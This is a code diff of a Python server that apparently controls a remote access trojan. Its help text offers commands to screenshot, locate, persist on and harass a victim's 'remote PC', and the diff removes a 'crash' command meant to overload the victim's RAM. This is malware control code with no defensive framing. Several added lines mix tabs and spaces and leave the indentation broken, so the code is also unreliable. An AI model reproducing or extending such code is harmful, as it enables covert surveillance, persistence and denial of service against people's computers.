@@ -48,7 +48,6 @@ class ThreadedServer:
         screenshot                   - Screenshot screen and saves it on remote PC with random name in current working directory
         private_ip                   - Shows private IP address of remote PC
         autorun                      - Adds software to autorun on remote PC
-        crash                        - overload RAM on remote PC
         swapmouse                    - Swaps mouse buttons on remote PC
         
         """
@@ -142,24 +141,19 @@ class ThreadedServer:
                             engine.runAndWait()
                         elif command == "clear":
                             os.system("cls")
-                        elif command == "crash":
-                            engine.say("WARNING! This command will overload RAM of client! If u not runned before `autorun` command then client app will not be runned automatically when PC starts!\n Do u want to continue?")
-                            engine.runAndWait()
-                            conf = input("WARNING! This command will overload RAM of client! If u not runned before `autorun` command then client app will not be runned automatically when PC starts!\n Do u want to continue?")
-                            if "y" in conf:
-                                self.send(command, s)
-                                print(self.recv(s))
+     
     
                         elif command == "exit":
                             break
                         else:
                             self.send(command, s)
-                            try:
-                                del self.clients[int(lcmd.split(" ")[1])]
-                            except:
-                                pass
+                        	
                             print(self.recv(s))
                 except:
+					try:
+                    	del self.clients[int(lcmd.split(" ")[1])]
+                    except:
+                        pass
                     print("Invalid shell ID")
                     continue
             elif lcmd == "targets":
